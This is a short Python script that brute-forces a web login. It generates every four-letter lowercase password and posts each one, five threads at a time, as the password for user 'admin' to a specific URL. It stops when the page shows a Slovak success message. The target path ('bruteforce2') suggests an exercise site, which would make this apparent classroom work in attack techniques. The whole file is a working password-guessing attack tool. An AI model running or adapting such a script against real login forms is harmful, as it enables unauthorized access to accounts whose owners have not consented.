import string
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor


login_successful = False

def try_login(password):
    global login_successful  

    if login_successful:
        return 

    url = 'https://dudo.gvpt.sk/bruteforce2/index.php'
    data = {'username': 'admin', 'password': password}

 
    response = requests.post(url, data=data)

  
    if 'Úspešne si sa prihlásil' in response.text:
        login_successful = True  
        print(f"Login successful. Password: {password}")

    else:
        print(f"Login failed. Password: {password}")

if __name__ == "__main__":
    alphabet = string.ascii_lowercase
    password_combinations = [i + j + k + l for i in alphabet for j in alphabet for k in alphabet for l in alphabet]
    print(password_combinations)

  
    num_threads = 5 

    
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        results = executor.map(try_login, password_combinations)










































